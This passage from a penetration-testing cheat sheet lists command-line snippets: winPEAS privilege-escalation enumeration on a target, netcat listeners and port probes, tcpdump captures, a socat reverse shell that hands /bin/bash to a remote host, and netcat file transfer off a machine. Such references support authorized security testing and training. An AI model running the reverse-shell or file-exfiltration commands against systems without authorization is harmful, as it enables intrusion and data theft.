# Transfer winPEASx64.exe to target then:
.\winPEASx64.exe | Tee-Object -FilePath winpeas_out.txt
```

---

## Miscellaneous

```bash
# netcat — listeners and port probes
nc -lvnp $LPORT                     # listener
nc $IP $LPORT                       # connect
nc -zv $IP 22 80 443 445            # port probe

# tcpdump — capture traffic
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 445
tcpdump -i any host $IP and not port 22

# socat
socat TCP-LISTEN:$LPORT,reuseaddr -                     # listener
socat TCP:$IP:$LPORT EXEC:/bin/bash,pty,stderr,setsid    # connect with PTY

# Netcat file transfer
# Receiver:  nc -lvnp 9999 > file.txt
# Sender:    nc $LHOST 9999 < file.txt

# Quick HTTP response test
curl -s -o /dev/null -w "%{http_code}" http://$IP/path

# Check credentials in various services quickly
for port in 21 22 80 443 445 3389; do nc -zv $IP $port 2>&1; done

# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f ./pentest_key

# Decode base64
echo "base64string" | base64 -d

# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('string'))"

# Check for sudo token reuse (CVE-2019-14287 etc.)
sudo -V | head -1

# Background a process / bring back
Ctrl+Z; bg; fg

# Check open file handles (find which process has a file open)
lsof /path/to/file
lsof -i :$LPORT
```
